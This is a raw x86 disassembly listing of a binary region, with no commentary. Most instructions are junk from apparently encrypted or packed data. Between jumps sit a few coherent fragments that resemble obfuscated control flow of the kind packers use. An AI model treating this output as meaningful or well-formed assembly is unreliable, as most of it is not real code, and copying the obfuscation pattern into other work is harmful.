  409489:	retf   0x128b
  40948c:	mov    bl,0x8f
  40948e:	push   eax
  40948f:	sbb    al,0x3d
  409491:	or     edx,eax
  409493:	arpl   WORD PTR [ebp-0x61f6b604],si
  409499:	rcr    edi,0x7e
  40949c:	mov    ds:0xcd8a2042,al
  4094a1:	and    ecx,DWORD PTR [ebp-0x1a65111e]
  4094a7:	dec    esp
  4094a8:	and    bh,dl
  4094aa:	jno    0x4094e2
  4094ac:	mov    BYTE PTR [edx+0x64],cl
  4094af:	gs mov cl,0xe9
  4094b2:	jne    0x409448
  4094b4:	push   0x3
  4094b6:	les    edx,FWORD PTR [ebx]
  4094b8:	test   eax,0x6521de5f
  4094bd:	add    eax,0x2d02b160
  4094c2:	xchg   BYTE PTR [ebp+0x21a7a4c3],bl
  4094c8:	std    
  4094c9:	xor    al,0xa3
  4094cb:	sub    al,0x9c
  4094cd:	in     al,dx
  4094ce:	call   0xdf43:0x54769286
  4094d5:	fisttp DWORD PTR [edi-0x7e]
  4094d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094d9:	mov    bl,0x63
  4094db:	and    al,0x27
  4094dd:	addr16 push ecx
  4094df:	or     ebx,DWORD PTR [esi+edi*4-0x67]
  4094e3:	repnz dec esi
  4094e5:	mov    DWORD PTR [ebp-0x120e6a16],ecx
  4094eb:	fisttp WORD PTR [edx+0x40]
  4094ee:	test   DWORD PTR [ebp+0x7f70ac0f],edi
  4094f4:	or     al,0x75
  4094f6:	sub    al,0x23
  4094f8:	fldcw  WORD PTR [esi+eiz*2]
  4094fb:	and    ch,BYTE PTR [esi+0x4c88ab8a]
  409501:	das    
  409502:	mov    cl,0xe4
  409504:	(bad)  
  409505:	std    
  409506:	inc    edi
  409507:	or     BYTE PTR [ecx+eax*4],ah
  40950a:	sbb    cl,BYTE PTR [ebx+0x45437410]
  409510:	push   ecx
  409511:	scas   eax,DWORD PTR es:[edi]
  409512:	mov    edi,0x9225c22
  409517:	adc    al,0x55
  409519:	pop    es
  40951a:	sbb    DWORD PTR [ebp+eiz*1-0x58704f5c],ebp
  409521:	xor    BYTE PTR [ecx],0xb7
  409524:	dec    esp
  409525:	inc    ecx
  409526:	add    al,0xb3
  409528:	adc    eax,0x3752379c
  40952d:	clc    
  40952e:	jnp    0x409576
  409530:	sbb    esi,DWORD PTR [edx+0x0]
  409533:	nop
  409534:	xchg   edx,eax
  409535:	sub    ebp,ebx
  409537:	inc    edx
  409538:	lea    esi,[eax-0x72]
  40953b:	add    al,0x8a
  40953d:	or     bl,BYTE PTR [eax+0x2562f384]
  409543:	xchg   ecx,eax
  409545:	test   DWORD PTR [esi-0x69],0x37e64969
  40954c:	jae    0x4095a0
  40954e:	js     0x409530
  409550:	scas   eax,DWORD PTR es:[edi]
  409551:	loop   0x409501
  409553:	daa    
  409554:	cs mov ebp,0x582a406a
  40955a:	jbe    0x409543
  40955c:	xchg   ebp,eax
  40955d:	jge    0x40958a
  40955f:	sbb    edx,DWORD PTR [eax-0x27]
  409562:	ins    DWORD PTR es:[edi],dx
  409563:	ja     0x4095dc
  409565:	mov    dl,0x74
  409567:	sub    esp,DWORD PTR [edx+ebp*8-0x2e]
  40956b:	int3   
  40956c:	pop    ecx
  40956d:	mov    ebx,0x6cc1b080
  409572:	imul   edi,DWORD PTR [edx],0x64
  409575:	dec    ebx
  409576:	mov    BYTE PTR [ecx],0x6a
  409579:	inc    edi
  40957a:	scas   eax,DWORD PTR es:[edi]
  40957b:	jnp    0x40956d
  40957d:	cmp    ebx,ebp
  40957f:	mov    dh,0x46
  409581:	scas   al,BYTE PTR es:[edi]
  409582:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409583:	adc    al,0x1d
  409585:	dec    eax
  409586:	push   ebp
  409587:	pop    ecx
  409588:	mov    edx,0x8aa46d90
  40958d:	clc    
  40958e:	pusha  
  40958f:	and    BYTE PTR [eax],dh
  409591:	xchg   ecx,eax
  409592:	mov    dl,0xdf
  409594:	adc    BYTE PTR [ebp+0x73452866],ah
  40959a:	loopne 0x409597
  40959c:	leave  
  40959d:	test   al,0x87
  40959f:	adc    esi,esi
  4095a1:	and    al,0xf5
  4095a3:	pusha  
  4095a4:	(bad)  
  4095a5:	adc    BYTE PTR [esp+ecx*8-0x39],dh
  4095a9:	push   ecx
  4095aa:	cdq    
  4095ab:	mov    edx,0x2a80c662
  4095b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095b1:	pop    ebx
  4095b2:	push   esi
  4095b3:	cmp    DWORD PTR [ebx],0xffffffdc
  4095b6:	mov    dh,0x39
  4095b8:	(bad)  
  4095b9:	fdiv   QWORD PTR [ecx+esi*1-0x59]
  4095bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095be:	and    DWORD PTR ds:0xe811695d,edi
  4095c4:	jns    0x4095ff
  4095c6:	jbe    0x4095d2
  4095c8:	pop    ebp
  4095c9:	popa   
  4095ca:	xchg   BYTE PTR [edi-0x61],bl
  4095cd:	cdq    
  4095ce:	xor    ebx,DWORD PTR [ebx]
  4095d0:	mov    ah,BYTE PTR [eax+0x377852d3]
  4095d6:	push   edi
  4095d7:	ficom  DWORD PTR [edx]
  4095d9:	or     DWORD PTR [esi+0xca60ed8],0xffffffe4
  4095e0:	into   
  4095e1:	cs pop esi
  4095e3:	shr    DWORD PTR [eax+0x64c0bf54],cl
  4095e9:	mov    ds:0xa743e963,al
  4095ee:	jg     0x409578
  4095f0:	or     BYTE PTR ds:0x81c61812,bh
  4095f6:	jb     0x409632
  4095f8:	hlt    
  4095f9:	sbb    DWORD PTR [eax+0x33],ecx
  4095fc:	stos   DWORD PTR es:[edi],eax
  4095fd:	and    eax,0x5a81e10e
  409602:	push   eax
  409603:	xchg   edx,eax
  409604:	cmp    DWORD PTR [eax-0x3c5e94fa],edx
  40960a:	cld    
  40960b:	repz fbstp TBYTE PTR [ecx+edi*1-0x24]
  409610:	add    bl,BYTE PTR [ebx-0x59]
  409613:	sub    BYTE PTR [ecx-0x3],dl
  409616:	imul   BYTE PTR [eax+0x57]
  409619:	cmp    eax,0x6bebd83
  40961e:	out    0x1f,al
  409620:	lds    edi,FWORD PTR ds:0xff2f1021
  409626:	cmp    al,0x28
  409628:	push   es
  409629:	lahf   
  40962a:	mov    dh,0xf0
  40962c:	fdivr  DWORD PTR [ebp+0x5f]
  40962f:	cwde   
  409630:	jo     0x40969e
  409632:	sbb    eax,0xec550301
  409637:	mov    DWORD PTR [ebp-0x14],edx
  40963a:	mov    edx,DWORD PTR [ebp-0xc]
  40963d:	mov    edi,DWORD PTR [ebp-0x24]
  409640:	xor    edx,eax
  409642:	jmp    0x409856
  409647:	dec    ebp
  409648:	iret   
  409649:	lods   eax,DWORD PTR ds:[esi]
  40964a:	dec    ebx
  40964b:	lods   eax,DWORD PTR ds:[esi]
  40964c:	imul   ebp,DWORD PTR [ecx-0x37],0x8e1037e1
  409653:	pop    ecx
  409654:	dec    ecx
  409655:	and    al,0xb3
  409657:	mul    esi
  409659:	jo     0x4096cb
  40965b:	imul   edi,DWORD PTR [edi+0x70],0xaf0a9a70
  409662:	cwde   
  409663:	outs   dx,DWORD PTR ds:[esi]
  409664:	jne    0x40969b
  409666:	xlat   BYTE PTR ds:[ebx]
  409667:	pop    eax
  409668:	pop    ebp
  409669:	mov    ebx,DWORD PTR [edx+edi*2]
  40966c:	(bad)  
  40966d:	adc    dh,dh
  40966f:	ret    
  409670:	sar    BYTE PTR [edx+eiz*2-0x5ced43c8],1
  409677:	jo     0x409631
  409679:	std    
  40967a:	mov    esi,0xd337ede1
  40967f:	stos   DWORD PTR es:[edi],eax
  409680:	cwde   
  409681:	out    0x19,eax
  409683:	or     esi,DWORD PTR [edx+0x51b012d1]
  409689:	popa   
  40968a:	scas   eax,DWORD PTR es:[edi]
  40968b:	retf   0x73e1
  40968e:	(bad)  
  40968f:	repnz cmp ecx,ebp
  409692:	add    al,0x4f
  409694:	dec    ebp
  409695:	lahf   
  409696:	ror    BYTE PTR [eax+ebx*4-0x38],cl
  40969a:	inc    edx
  40969b:	test   BYTE PTR [edx-0x43],bl
  40969e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40969f:	xor    eax,0x2344f0e3
  4096a4:	cdq    
  4096a5:	adc    BYTE PTR [ecx-0x271f038c],cl
  4096ab:	jo     0x4096ed
  4096ad:	inc    ecx
  4096ae:	sbb    bl,BYTE PTR [ebp-0x5d]
  4096b1:	dec    ecx
  4096b2:	retf   0xa6dc
  4096b5:	outs   dx,DWORD PTR ds:[esi]
  4096b6:	or     cl,BYTE PTR [ebx+0x1]
  4096b9:	cmp    BYTE PTR [eax-0x68],0x80
  4096bd:	sub    BYTE PTR [edi],bl
  4096bf:	call   0xaf226bdb
  4096c4:	cmp    eax,0x2bf38419
  4096c9:	cmp    DWORD PTR ds:0xc60de37e,ebx
  4096cf:	mov    ch,0xd4
  4096d1:	jbe    0xb645fc5e
  4096d7:	add    BYTE PTR [ecx-0x5c496373],ch
  4096dd:	retf   
  4096de:	and    esp,ebp
  4096e0:	gs pop ecx
  4096e2:	imul   BYTE PTR [ebx-0x63]
  4096e5:	shl    BYTE PTR [edx-0x10],0x0
  4096e9:	shl    DWORD PTR [ebp+eiz*4-0x7023d3d6],cl
  4096f0:	fiadd  WORD PTR es:[edx+0x5f]
  4096f4:	(bad)  
  4096f5:	push   ss
  4096f6:	cmp    al,0xe5
  4096f8:	sub    al,0xd3
  4096fa:	mov    bl,BYTE PTR [esi-0x7a]
  4096fd:	inc    eax
  4096fe:	pusha  
  4096ff:	imul   edi,DWORD PTR [esi],0xffffffb3
  409702:	cmp    al,bh
  409704:	stos   BYTE PTR es:[edi],al
  409705:	or     esi,edi
  409707:	or     al,0xf3
  409709:	stos   BYTE PTR es:[edi],al
  40970a:	retf   
  40970b:	les    ebp,FWORD PTR [esi+eiz*4]
  40970e:	cmc    
  40970f:	mov    ecx,0x3db67297
  409714:	jg     0x409781
  409716:	xor    dh,dl
  409718:	retf   0x9172
  40971b:	stos   DWORD PTR es:[edi],eax
  40971c:	and    esp,DWORD PTR [eax+0x6]
  40971f:	adc    ebp,edi
  409721:	xor    al,0x31
  409723:	push   ds
  409724:	inc    ebx
  409725:	mov    dh,0x6
  409727:	jmp    0xe5a67563
  40972c:	push   ecx
  40972d:	add    eax,0x2176a79a
  409732:	in     al,0xb1
  409734:	or     BYTE PTR [eax+0x18443890],cl
  40973a:	dec    eax
  40973b:	push   ss
  40973c:	mov    esi,ecx
  40973e:	cmp    BYTE PTR [eax],dh
  409740:	shl    bh,1
  409742:	rol    ecx,cl
  409744:	pop    edx
  409745:	lods   eax,DWORD PTR ds:[esi]
  409746:	pop    ds
  409747:	pop    eax
  409748:	std    
  409749:	mov    ds,edx
  40974b:	mov    ?,WORD PTR [ecx+0x61ddeed7]
  409751:	xor    DWORD PTR [edx-0x6],ebx
  409754:	xchg   BYTE PTR [esi],bl
  409756:	push   esp
  409757:	in     eax,0x71
  409759:	clc    
  40975a:	data16 sti 
  40975c:	in     al,0x30
  40975e:	or     ebx,DWORD PTR [ebx-0x64]
  409761:	sub    dl,al
  409763:	dec    eax
  409764:	bound  edi,QWORD PTR gs:[ecx-0x2fdc42c1]
  40976b:	(bad)  
  40976c:	sub    BYTE PTR [edx],cl
  40976e:	ja     0x4097cb
  409770:	iret   
  409771:	or     eax,0x4520c872
  409776:	or     al,0x68
  409778:	dec    eax
  409779:	(bad)  
  40977a:	icebp  
  40977b:	push   ebp
  40977c:	and    bl,ch
  40977e:	pop    esi
  40977f:	xchg   ebp,eax
  409780:	add    al,BYTE PTR ds:0xa9fd5b28
  409786:	xchg   dh,bl
  409788:	(bad)  
  409789:	in     al,0xb3
  40978b:	pop    edi
  40978c:	pop    eax
  40978d:	sub    DWORD PTR [esi-0x17],0x16
  409791:	pop    ecx
  409792:	(bad)  
  409793:	mov    ecx,0xed4133a3
  409798:	lods   eax,DWORD PTR ds:[esi]
  409799:	jae    0x409742
  40979b:	stc    
  40979c:	jb     0x4097fa
  40979e:	neg    DWORD PTR [ebx-0x2e165aa8]
  4097a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097a5:	pop    edx
  4097a6:	sti    
  4097a7:	sbb    al,0x62
  4097a9:	cwde   
  4097aa:	sbb    al,0xbb
  4097ac:	out    dx,eax
  4097ad:	hlt    
  4097ae:	retf   0xbc12
  4097b1:	mov    ch,0x79
  4097b3:	loop   0x409736
  4097b5:	xor    DWORD PTR [ecx+0x26],esp
  4097b8:	cli    
  4097b9:	xor    DWORD PTR [edx-0x108c5ef],ecx
  4097bf:	lea    esi,[esi-0x4e0157fb]
  4097c5:	(bad)  
  4097c6:	ret    
  4097c7:	test   DWORD PTR cs:[esi],edi
  4097ca:	sub    eax,0xb6caa02e
  4097cf:	test   DWORD PTR [edi-0x7a597938],ecx
  4097d5:	mov    ebx,0x2b281a54
  4097da:	in     al,dx
  4097db:	push   cs
  4097dc:	dec    edx
  4097dd:	pushf  
  4097de:	push   edi
  4097df:	sahf   
  4097e0:	ds in  eax,dx
  4097e2:	icebp  
  4097e3:	out    dx,al
  4097e4:	outs   dx,DWORD PTR ds:[esi]
  4097e5:	stos   BYTE PTR es:[edi],al
  4097e6:	mov    esp,0x9efacc87
  4097eb:	pusha  
  4097ec:	leave  
  4097ed:	cmp    ah,BYTE PTR [ebp+edi*8+0x3fb33937]
  4097f4:	pop    esp
  4097f5:	fisttp WORD PTR [esi-0xac4507a]
  4097fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097fc:	mov    al,0x69
  4097fe:	mov    ds:0xcedce20b,al
  409803:	cmp    ch,bh
  409805:	mov    al,0x36
  409807:	cmp    ecx,esp
  409809:	int3   
  40980a:	clc    
  40980b:	test   DWORD PTR [ecx+0x70],edx
  40980e:	fsub   DWORD PTR [ecx]
  409810:	and    dh,dh
  409812:	pop    edx
  409813:	mov    eax,0x3d42213a
  409818:	out    0xd8,al
  40981a:	imul   DWORD PTR [eax+0xb]
  40981d:	push   esi
  40981e:	sbb    DWORD PTR [ebp+0x26],0x43
  409822:	sub    ah,BYTE PTR [esi-0x48603d6e]
  409828:	iret   
  409829:	cmp    esp,DWORD PTR [ebx]
  40982b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40982c:	cli    
  40982d:	and    al,0xfc
  40982f:	ds mov bl,0xbd
  409832:	pushf  
  409833:	jns    0x40980f
  409835:	pop    ebx
  409836:	jge    0x40982c
  409838:	sti    
  409839:	jge    0x4097ca
  40983b:	sub    ebx,edi
  40983d:	mov    ah,0xf8
  40983f:	aas    
  409840:	xchg   ecx,eax
  409841:	pop    ebx
  409842:	xchg   edi,eax
  409843:	and    bl,bl
  409845:	mov    dh,0x5d
  409847:	inc    esi
  409848:	call   0xde6b5574
  40984d:	cmp    BYTE PTR [ebp+0x4d],bl
  409850:	mov    bl,0xac
  409852:	pop    esp
  409853:	stos   BYTE PTR es:[edi],al
  409854:	call   0xd7af:0xfd103b8
  40985b:	mov    edi,DWORD PTR [ebp-0xc]
  40985e:	xor    edi,eax
  409860:	sub    edx,edi
  409862:	mov    edi,DWORD PTR [ebp-0xc]
  409865:	mov    ebx,DWORD PTR [ebp-0x14]
  409868:	xor    edi,eax
  40986a:	add    edi,ecx
  40986c:	imul   edi,ebx
  40986f:	mov    ebx,DWORD PTR [ebp-0x18]
  409872:	xor    ebx,eax
  409874:	sub    edx,ecx
  409876:	lea    edi,[edi+ebx*1+0x32729c]
  40987d:	cmp    edi,edx
  40987f:	jbe    0x408b6b
  409885:	mov    edx,DWORD PTR [ebp-0xc]
  409888:	jmp    0x409a9c
  40988d:	int3   
  40988e:	sub    eax,0xbde9be20
  409893:	push   0xffffffa9
  409895:	mov    ebp,0x5e7bf628
  40989a:	mov    eax,0xe4e03aa1
  40989f:	jo     0x409911
  4098a1:	imul   edi,DWORD PTR [edi+0x70],0x432d8070
  4098a8:	ret    
  4098a9:	sub    al,0x2a
  4098ab:	and    BYTE PTR [esi-0x5e35798b],bh
  4098b1:	fisttp QWORD PTR [ebp-0x6d61d24d]
  4098b7:	out    0x70,eax
  4098b9:	fadd   st(1),st
  4098bb:	daa    
  4098bc:	rcl    dl,0xd8
  4098bf:	fsub   st(5),st
  4098c1:	sbb    eax,0x1f0b23e1
  4098c6:	mov    al,ds:0x34094e1d
  4098cb:	mov    ebp,0xa0dfacc7
  4098d0:	mov    dl,BYTE PTR [edi]
  4098d2:	outs   dx,BYTE PTR ds:[esi]
  4098d3:	xlat   BYTE PTR ds:[ebx]
  4098d4:	cwde   
  4098d5:	inc    eax
  4098d6:	mov    dl,0xca
  4098d8:	inc    ecx
  4098d9:	repnz cwde 
  4098db:	pop    esp
  4098dc:	enter  0x4237,0x27
  4098e0:	add    esp,DWORD PTR [edi+0x748c2e0a]
  4098e6:	nop
  4098e7:	addr16 adc eax,0x5141209e
  4098ed:	xlat   BYTE PTR ds:[ebx]
  4098ee:	inc    edx
  4098ef:	add    bh,bl
  4098f1:	jge    0x4098f1
  4098f3:	test   al,0x69
  4098f5:	addr16 fdivr st,st(4)
  4098f8:	push   ds
  4098f9:	arpl   WORD PTR [edx-0x237c1f50],bp
  4098ff:	mov    esp,?
  409901:	sbb    BYTE PTR [ebp+0x51],0x78
  409905:	ja     0x409888
  409907:	mov    DWORD PTR [edi-0x2d37550],0x6175114a
  409911:	cmp    esp,esi
  409913:	repnz dec edx
  409915:	xor    edi,DWORD PTR [edi]
  409917:	push   esp
  409918:	push   0xffffffb3
  40991a:	mov    bh,0x72
  40991c:	cmp    al,0xfc
  40991e:	mov    dh,0x36
  409920:	inc    edx
  409921:	repnz lods al,BYTE PTR ds:[esi]
  409923:	out    dx,al
  409924:	and    esp,DWORD PTR [esi]
  409926:	mov    ecx,0xa323fd4b
  40992b:	stos   BYTE PTR es:[edi],al
  40992c:	pushf  
  40992d:	and    ch,BYTE PTR [edi-0x16b240ef]
  409933:	push   cs
  409934:	ja     0x4098fb
  409936:	scas   al,BYTE PTR es:[edi]
  409937:	dec    edi
  409938:	(bad)  
  409939:	jbe    0x4098dc
  40993b:	shl    DWORD PTR [ecx],1
  40993d:	or     al,0xa0
  40993f:	add    eax,0x80b510d2
  409944:	pusha  
  409945:	xor    eax,0x4d624ecf
  40994a:	and    al,0x1
  40994c:	repnz test al,0xe6
  40994f:	xchg   edi,eax
  409950:	jo     0x409949
  409952:	jnp    0x4099c6
  409954:	les    esp,FWORD PTR [ebx-0x2c]
  409957:	sub    eax,0x5849df4
  40995c:	ss mov bl,ch
  40995f:	mov    al,0x31
  409961:	outs   dx,BYTE PTR fs:[esi]
  409963:	mov    bl,0x60
  409965:	mov    WORD PTR [edx+0x58],?
  409968:	fwait
  409969:	lods   eax,DWORD PTR ds:[esi]
  40996a:	jl     0x4099ac
  40996c:	cmp    BYTE PTR [ecx+ecx*2+0x69],bh
  409970:	stc    
  409971:	mov    edi,0x8f9d0b8
  409976:	ficomp WORD PTR [edi+0x39f35279]
  40997c:	xor    BYTE PTR [eax*8+0x3bfc90e1],cl
  409983:	xchg   esp,eax
  409984:	nop
  409985:	xchg   BYTE PTR es:[ecx+0x1d],bh
  409989:	ror    cl,cl
  40998b:	sub    DWORD PTR [bx+di-0x53],esp
  40998f:	outs   dx,DWORD PTR cs:[esi]
  409991:	push   0xe5974864
  409996:	(bad)  [edx]
  409998:	mov    bh,0xbd
  40999a:	jae    0x409a16
  40999c:	mov    eax,0xac55409c
  4099a1:	fs cwde 
  4099a3:	std    
  4099a4:	mov    al,0x2b
  4099a6:	push   esi
  4099a7:	mov    ch,0xaa
  4099a9:	lea    edi,[ecx]
  4099ab:	mov    bl,0x95
  4099ad:	cmp    eax,0xaf0ae6a5
  4099b2:	div    esp
  4099b4:	add    BYTE PTR [eax+0x43],ah
  4099b7:	fwait
  4099b8:	leave  
  4099b9:	mov    al,0xef
  4099bb:	inc    esi
  4099bc:	dec    esp
  4099bd:	loopne 0x409a20
  4099bf:	lods   al,BYTE PTR ds:[esi]
  4099c0:	stc    
  4099c1:	hlt    
  4099c2:	mov    WORD PTR [ebp-0x5c607eb9],gs
  4099c8:	xor    DWORD PTR [edi+0xc80d60a],edi
  4099ce:	mov    BYTE PTR [edi],dh
  4099d0:	nop
  4099d1:	adc    esi,esi
  4099d3:	jg     0x4099db
  4099d5:	fdiv   DWORD PTR [ebp-0x493189a0]
  4099db:	xor    DWORD PTR [esi+0x21b7f77],esi
  4099e1:	xor    al,0x64
  4099e3:	std    
  4099e4:	or     cl,dl
  4099e6:	outs   dx,BYTE PTR ds:[esi]
  4099e7:	cmp    ah,ah
  4099e9:	mov    ch,0xd5
  4099eb:	test   al,0x96
  4099ed:	scas   eax,DWORD PTR es:[edi]
  4099ee:	loop   0x4099db
  4099f0:	inc    eax
  4099f1:	inc    edx
  4099f2:	add    BYTE PTR [ebp+ecx*2+0x195296b9],cl
  4099f9:	cmp    BYTE PTR [edx],0x31
  4099fc:	psubb  mm4,QWORD PTR [edi+0x58e8d90b]
  409a03:	jbe    0x4099c8
  409a05:	dec    edx
  409a06:	add    ch,al
  409a08:	retf   
  409a09:	push   esi
  409a0a:	pop    esi
  409a0b:	xor    eax,DWORD PTR [ebx-0xa]
  409a0e:	pop    es
  409a0f:	shl    cl,cl
  409a11:	jp     0x409a45
  409a13:	or     al,0x82
  409a15:	sar    BYTE PTR [edi-0x65],1
  409a18:	imul   eax,DWORD PTR [ebx+0x6e],0x16
  409a1c:	dec    esp
  409a1d:	dec    esp
  409a1e:	push   esp
  409a1f:	fistp  DWORD PTR [ecx+0x9]
  409a22:	cs call 0x836c:0xde614fee
  409a2a:	pop    es
  409a2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a2c:	fdivr  DWORD PTR [eax]
  409a2e:	jae    0x409a81
  409a30:	adc    ebp,esp
  409a32:	or     BYTE PTR [esi-0x3b6d3e9e],dh
  409a38:	push   edx
  409a39:	mov    bl,0xc0
  409a3b:	push   ebp
  409a3c:	jmp    0x4099cd
  409a3e:	or     dh,BYTE PTR [ecx-0x3a]
  409a41:	stos   DWORD PTR es:[edi],eax
  409a42:	hlt    
  409a43:	and    eax,0xd87fc1a1
  409a48:	xor    eax,0xb9a4e02
  409a4d:	mov    ebx,0xf051c497
  409a52:	add    eax,0xbfceda3a
  409a57:	mov    esi,DWORD PTR ds:0x4c46f991
  409a5d:	mov    dh,BYTE PTR ds:0x4be9f640
  409a63:	cld    
  409a64:	cdq    
  409a65:	dec    ecx
  409a66:	ficom  WORD PTR [esi-0x473baf2c]
  409a6c:	(bad)  
  409a6d:	pop    edx
  409a6e:	xchg   BYTE PTR [ebx],ch
  409a70:	jecxz  0x409ac8
  409a72:	ror    cl,cl
  409a74:	in     eax,0xac
  409a76:	out    dx,al
  409a77:	adc    dh,ah
  409a79:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a7b:	(bad)
  409a7e:	popa   
  409a7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a80:	popa   
  409a81:	out    dx,eax
  409a82:	popa   
  409a83:	push   0xffffffd7
  409a85:	and    bl,dh
  409a87:	add    DWORD PTR [edi],ebp
  409a89:	add    DWORD PTR [eax+0x1cafa935],ebx
  409a8f:	(bad)  
  409a90:	(bad)  
  409a91:	stc    
  409a92:	hlt    
  409a93:	mov    bh,0x7f
  409a95:	cmp    al,0x76
  409a97:	(bad)  
  409a98:	mov    ebx,0x8b4cb69b
  409a9d:	jge    0x409a7b
  409a9f:	xor    edx,eax
  409aa1:	add    edx,ecx
  409aa3:	imul   edx,edi
  409aa6:	mov    edi,DWORD PTR [ebp-0x18]
  409aa9:	xor    edi,eax
  409aab:	add    edx,edi
  409aad:	mov    edi,DWORD PTR [ebp-0x8]
  409ab0:	lea    edx,[edx+edi*1+0x32729c]
  409ab7:	mov    DWORD PTR [ebp-0x8],edx
  409aba:	mov    edx,DWORD PTR [ebp-0x20]
  409abd:	jmp    0x409cd1
  409ac2:	popa   
  409ac3:	ja     0x409abc
  409ac5:	add    esi,ecx
  409ac7:	xor    DWORD PTR [ecx+0x75],0xffffffde
  409acb:	adc    al,0xb4
  409acd:	mov    dl,BYTE PTR [ebx+0x0]
  409ad0:	mov    ebx,0x70e2d906
  409ad5:	jo     0x409b40
  409ad7:	jg     0x409b49
  409ad9:	jo     0x409aa1
  409adb:	fsubr  DWORD PTR [edi]
  409add:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ade:	fisttp WORD PTR ds:0xb259fb8d
  409ae4:	scas   al,BYTE PTR es:[edi]
  409ae5:	sbb    bl,cl
  409ae7:	mov    eax,0x194ea385
  409aec:	mov    al,0x53
  409aee:	add    ch,ch
  409af0:	shl    DWORD PTR [edx+0x403e7af8],1
  409af6:	cmp    edx,DWORD PTR [ebp+0x5a9d23f4]
  409afc:	push   eax
  409afd:	xor    al,BYTE PTR [esi]
  409aff:	add    al,0xaf
  409b01:	push   0xffffffda
  409b03:	popf   
  409b04:	mov    cs,WORD PTR [eax]
  409b06:	jp     0x409ac1
  409b08:	mov    ebp,0xb364792e
  409b0d:	test   eax,0xe5c087cb
  409b12:	xchg   edx,eax
  409b13:	jnp    0x409aa2
  409b15:	xchg   esp,eax
  409b16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b17:	mov    ds:0xeecfc709,eax
  409b1c:	test   ebx,ebx
  409b1e:	sbb    dh,BYTE PTR [esi]
  409b20:	pusha  
  409b21:	pop    ebp
  409b22:	rol    DWORD PTR [ecx+0xb],1
  409b25:	jno    0x7bea046c
  409b2b:	push   ebx
  409b2c:	pop    edx
  409b2d:	popa   
  409b2e:	sbb    al,0x17
  409b30:	mov    eax,ds:0x6e37b223
  409b35:	daa    
  409b36:	outs   dx,DWORD PTR ds:[esi]
  409b37:	xchg   ecx,eax
  409b38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b39:	sub    BYTE PTR [ebx-0x11e17c3b],dh
  409b3f:	mov    esi,0x48923472
  409b44:	in     eax,0x24
  409b46:	retf   
  409b47:	repz inc ebp
  409b49:	jl     0x409b6b
  409b4b:	call   0xbb015c02
  409b50:	jmp    0xf098167d
  409b55:	outs   dx,BYTE PTR ds:[esi]
  409b56:	pop    ss
  409b57:	sub    al,0x7d
  409b5a:	xchg   ecx,eax
  409b5b:	and    eax,0x826ed3de
  409b60:	inc    ebp
  409b61:	pushf  
  409b62:	xchg   esi,eax
  409b63:	jbe    0x409b95
  409b65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b66:	bound  esi,QWORD PTR [edx+0xe9bc40c]
  409b6c:	adc    edx,DWORD PTR [eax]
  409b6e:	out    dx,al
  409b6f:	mov    ch,0xd5
  409b71:	ror    BYTE PTR [esi],0xe7
  409b74:	ja     0x409bb4
  409b76:	xor    DWORD PTR [edi+0x4],ecx
  409b79:	xlat   BYTE PTR ds:[ebx]
  409b7a:	fwait
  409b7b:	jmp    0x409b9d
  409b7d:	jmp    ecx
  409b7f:	cli    
  409b80:	push   edx
  409b81:	and    al,0x88
  409b83:	mov    al,0x3c
  409b85:	test   dh,0x8c
  409b88:	pop    es
  409b89:	xchg   esi,ebx
  409b8b:	pop    ss
  409b8c:	aaa    
  409b8d:	mov    ecx,0xe86df553
  409b92:	and    al,0x32
  409b94:	xlat   BYTE PTR ds:[ebx]
  409b95:	bound  esi,QWORD PTR [ecx-0x6db0dc6d]
  409b9b:	pop    eax
  409b9c:	sbb    dh,BYTE PTR [edi-0x21]
  409b9f:	repz adc al,0x5c
  409ba2:	mov    cl,BYTE PTR [esp+ecx*2-0x5a]
  409ba6:	inc    esi
  409ba7:	sbb    ebx,DWORD PTR [edx]
  409ba9:	inc    eax
  409baa:	pop    edx
  409bab:	(bad)  
  409bad:	int3   
  409bae:	or     esi,DWORD PTR [ebp-0x5cbe0f9]
  409bb4:	out    dx,al
  409bb5:	mov    ebx,0xf95e39d4
  409bba:	ret    0xa38d
  409bbd:	sbb    BYTE PTR [ecx],dl
  409bbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bc0:	lds    esi,FWORD PTR [ebx-0x71c48d23]
  409bc6:	dec    ebx
  409bc7:	xchg   edx,edi
  409bc9:	gs popa 
  409bcb:	jl     0x409b9f
  409bcd:	adc    eax,0xf905062d
  409bd2:	dec    ebp
  409bd3:	jp     0x409b7a
  409bd5:	out    dx,al
  409bd6:	repnz adc DWORD PTR ds:0x9a142428,0x6193d05e
  409be1:	pop    edx
  409be2:	push   esi
  409be3:	test   al,0x72
  409be5:	dec    BYTE PTR [esi+0x305f9ce1]
  409beb:	mov    dh,0x77
  409bed:	xlat   BYTE PTR ds:[ebx]
  409bee:	sub    dl,BYTE PTR [edi-0x1c]
  409bf1:	ret    
  409bf2:	aad    0xb9
  409bf4:	jne    0x409c3b
  409bf6:	add    eax,0x77ff93d9
  409bfb:	dec    ebx
  409bfc:	adc    esi,esp
  409bfe:	dec    ebp
  409bff:	xor    al,0x2e
  409c01:	pop    ss
  409c02:	mov    edi,0x74f04c7a
  409c07:	sbb    bh,BYTE PTR [esi]
  409c09:	repnz mov cl,0x5c
  409c0c:	push   0x7
  409c0e:	(bad)  
  409c10:	sub    edi,DWORD PTR [edx]
  409c12:	mov    edx,0xfeb224b5
  409c17:	inc    ebx
  409c18:	pop    ebx
  409c19:	pop    esi
  409c1a:	lock or BYTE PTR [eax+0x68eaebe3],al
  409c21:	icebp  
  409c22:	(bad)  
  409c24:	outs   dx,BYTE PTR ds:[esi]
  409c25:	pop    esi
  409c26:	and    BYTE PTR [esi],dl
